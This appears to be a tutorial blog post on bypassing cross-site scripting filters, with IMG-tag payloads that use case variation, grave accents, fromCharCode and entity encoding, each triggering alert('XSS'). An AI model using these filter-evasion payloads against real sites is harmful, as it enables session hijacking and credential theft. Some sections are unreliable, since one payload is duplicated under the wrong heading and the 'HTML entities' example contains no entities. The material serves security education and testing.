
---

# Advanced Cross Site Script filter bypassing #

---


Cross-Site Scripting attacks are a type of injection problem, in which malicious scripts are injected into the otherwise benign and trusted web sites. Cross-site scripting (XSS) attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user in the output it generates without validating or encoding it.

## What really is an XSS ##

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by your browser and used with that site. These scripts can even rewrite the content of the HTML page.

## What someone can do with XSS ##

Stealing the session cookie is not the only way to take advantage of an XSS attack, so with an XSS attack someone under certain conditions can:

  1. Hijack the user session and cause user identity theft (which by the way is none traceable).
  1. Inject a Trojan Web Form (e.g. using Cascading Style Sheets) and steal user credentials.
  1. Redirect users to phishing sites and steal user personal data.
  1. Execute a Web Site function (e.g. cause an attack similar to a CSRF attack).
  1. Bounce to the server a malicious payload (e.g. an executable, vbs or .bat file) and compromise the users PC/Laptop.
  1. Redirect the user browser to a BEEF (Browser Exploitation Framework) link and take over the user browser.
  1. Do a File Download injection using HTTP Header Injection (I consider Header Injection to be in the same category with XSS injection)

A conceptual representation of this type if attack can be found here:

![http://2.bp.blogspot.com/-4S90v3P19-c/T4aEmiazJWI/AAAAAAAAAL4/TIg8NqCTDss/s1600/Drawing1.png](http://2.bp.blogspot.com/-4S90v3P19-c/T4aEmiazJWI/AAAAAAAAAL4/TIg8NqCTDss/s1600/Drawing1.png)


**Note:** In this conceptual representation of the attack a malicious user sent an e-mail with the infected URL to the victim user and the victim user clicks on the URL.  This type of attack can also become more effective when Script Injection is stored into the vulnerable Web Application.

## Using case variation ##

Case variation can be used to bypass dummy filters:


---

```
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

---


**Note:** This I personally have never seen a case sensitive filter.

## Using the JavaScript directive ##

Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:


---

```
<IMG SRC="javascript:alert('XSS');">
```

---


## Using grave accent obfuscation ##

If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents:


---

```
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
```

---


## Using malformed IMG tags ##

Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:


---

```
<IMG SRC="javascript:alert('XSS');">
```

---


## Using the fromCharCode ##

if no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need:


---

```
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```

---


## Using UTF-8 unicode encoding ##

All of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).


---

```
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
&#39;&#88;&#83;&#83;&#39;&#41;>
```

---


## Using HTML entities ##

The semicolons are required for this to work:


---

```
<IMG SRC=javascript:alert("XSS")>
```

---


## Preventing XSS ##

The OWASP ESAPI project has produced a set of reusable security components in several languages, including validation and escaping routines to prevent parameter tampering and the injection of XSS attacks. In addition, the OWASP WebGoat Project training application has lessons on Cross-Site Scripting and data encoding. More XSS you can find in The Teenage Mutant Ninja Turtle Project.